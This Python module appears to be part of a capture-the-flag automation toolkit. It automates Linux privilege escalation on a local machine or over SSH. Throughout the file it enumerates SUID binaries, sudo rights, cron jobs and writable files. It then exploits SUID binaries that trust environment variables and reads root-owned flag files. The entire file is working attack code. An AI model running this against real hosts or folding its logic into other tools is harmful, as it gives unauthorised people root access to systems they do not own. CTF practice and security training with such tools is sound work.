#!/usr/bin/env python3
"""
Automatic Privilege Escalation Module
Handles: SUID detection, environment variable exploitation, automated priv esc
"""
import os
import re
import subprocess
import tempfile
from core.colors import red, green, yellow, blue, highlight
from core.tools import check_tool

FLAG_PATTERN = r'[a-zA-Z0-9_]+\{[^}]*\}'

class PrivEscAuto:
    def __init__(self, target=None):
        self.target = target  # Can be local path or remote session
        self.suid_binaries = []
        self.env_vulns = []
        self.cron_jobs = []
        self.writable_files = []
    
    def extract_flag(self, text):
        if not text:
            return None
        flags = re.findall(FLAG_PATTERN, str(text))
        if flags:
            return flags[0]
        return None
    
    def run_command(self, cmd):
        """Run command locally or remotely"""
        if self.target and '@' in str(self.target):
            # Remote via SSH
            return subprocess.getoutput(f"ssh {self.target} '{cmd}'")
        else:
            # Local
            return subprocess.getoutput(cmd)
    
    def find_suid_binaries(self):
        """Find all SUID binaries"""
        print(f"{green('[+]')} Searching for SUID binaries...")
        
        cmd = "find / -perm -4000 -type f 2>/dev/null | head -20"
        output = self.run_command(cmd)
        
        binaries = []
        for line in output.split('\n'):
            if line.strip():
                binaries.append(line.strip())
                print(f"{yellow('[*]')} Found SUID: {line.strip()}")
        
        self.suid_binaries = binaries
        return binaries
    
    def analyze_suid_binary(self, binary_path):
        """Analyze a SUID binary for vulnerabilities"""
        print(f"{yellow('[*]')} Analyzing {binary_path}...")
        
        # Check file type
        file_type = self.run_command(f"file {binary_path}")
        
        # Check strings for interesting functions
        strings = self.run_command(f"strings {binary_path} | grep -E 'getenv|setenv|system|exec|admin|root'")
        
        if 'getenv' in strings:
            print(f"{red('[!]')} Binary uses environment variables - possible vulnerability!")
            self.env_vulns.append(binary_path)
            
            # Extract environment variable names
            env_vars = re.findall(r'getenv\("([^"]+)"\)', strings)
            if env_vars:
                print(f"{green('[+]')} Environment variables: {env_vars}")
                return {'binary': binary_path, 'env_vars': env_vars, 'type': 'env'}
        
        # Check if it's the "checker" binary from walkthrough
        if 'checker' in binary_path and 'admin' in strings.lower():
            print(f"{red('[!]')} Detected 'checker' binary - try: export admin=1 && {binary_path}")
            return {'binary': binary_path, 'type': 'checker'}
        
        return None
    
    def exploit_env_variable(self, binary_path, env_var, value='1'):
        """Exploit environment variable vulnerability"""
        print(f"{green('[+]')} Attempting to exploit {binary_path} with {env_var}={value}")
        
        cmd = f"export {env_var}={value} && {binary_path}"
        output = self.run_command(cmd)
        
        # Check if we got root
        if 'root' in output.lower() or '#' in output or 'uid=0' in output:
            print(f"{red('[🏆]')} Privilege escalation successful!")
            
            # Try to get flag
            flag_cmd = "cat /root/root.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null"
            flag = self.run_command(flag_cmd)
            flag_found = self.extract_flag(flag)
            if flag_found:
                return flag_found
        
        return None
    
    def check_cron_jobs(self):
        """Check for interesting cron jobs"""
        print(f"{green('[+]')} Checking cron jobs...")
        
        cmd = "cat /etc/crontab 2>/dev/null"
        output = self.run_command(cmd)
        
        jobs = []
        for line in output.split('\n'):
            if line.strip() and not line.startswith('#'):
                jobs.append(line.strip())
                print(f"{yellow('[*]')} Cron: {line.strip()}")
        
        self.cron_jobs = jobs
        return jobs
    
    def find_writable_files(self):
        """Find world-writable files"""
        print(f"{green('[+]')} Searching for writable files...")
        
        cmd = "find / -writable -type f 2>/dev/null | grep -v '/proc/' | grep -v '/sys/' | head -20"
        output = self.run_command(cmd)
        
        files = []
        for line in output.split('\n'):
            if line.strip():
                files.append(line.strip())
                print(f"{yellow('[*]')} Writable: {line.strip()}")
        
        self.writable_files = files
        return files
    
    def check_sudo(self):
        """Check sudo privileges"""
        print(f"{green('[+]')} Checking sudo -l...")
        
        cmd = "sudo -l 2>/dev/null"
        output = self.run_command(cmd)
        
        if 'not allowed' not in output.lower() and 'password' not in output.lower():
            print(output)
            
            # Check for sudo vulnerabilities
            if 'env_keep' in output.lower():
                print(f"{red('[!]')} Sudo has env_keep - possible environment variable exploitation")
            
            # Try to get root with sudo
            if 'ALL' in output:
                cmd = "sudo cat /root/root.txt 2>/dev/null"
                flag = self.run_command(cmd)
                flag_found = self.extract_flag(flag)
                if flag_found:
                    return flag_found
        
        return None
    
    def auto_escalate(self):
        """Automatically try all privilege escalation techniques"""
        print(f"{green('[+]')} 🔍 Starting automatic privilege escalation...")
        
        # Check sudo first (easiest)
        flag = self.check_sudo()
        if flag:
            return flag
        
        # Find SUID binaries
        suid_binaries = self.find_suid_binaries()
        
        # Analyze each SUID binary
        for binary in suid_binaries:
            analysis = self.analyze_suid_binary(binary)
            
            if analysis:
                if analysis['type'] == 'checker':
                    # Special case for checker binary
                    cmd = f"export admin=1 && {binary}"
                    output = self.run_command(cmd)
                    
                    # Try to get flag as root
                    flag_cmd = "cat /root/root.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null"
                    flag = self.run_command(flag_cmd)
                    flag_found = self.extract_flag(flag)
                    if flag_found:
                        return flag_found
                
                elif analysis['type'] == 'env' and 'env_vars' in analysis:
                    for env_var in analysis['env_vars']:
                        flag = self.exploit_env_variable(binary, env_var)
                        if flag:
                            return flag
        
        # Check cron jobs
        self.check_cron_jobs()
        
        # Check writable files
        self.find_writable_files()
        
        return None


def run_privesc_auto(target=None):
    """Main privilege escalation entry point"""
    escalator = PrivEscAuto(target)
    return escalator.auto_escalate()


if __name__ == '__main__':
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else None
    result = run_privesc_auto(target)
    if result:
        print(f"\n{red('[🏆]')} Flag found: {green(result)}")
    else:
        print(f"{yellow('[-]')} No privilege escalation vector found")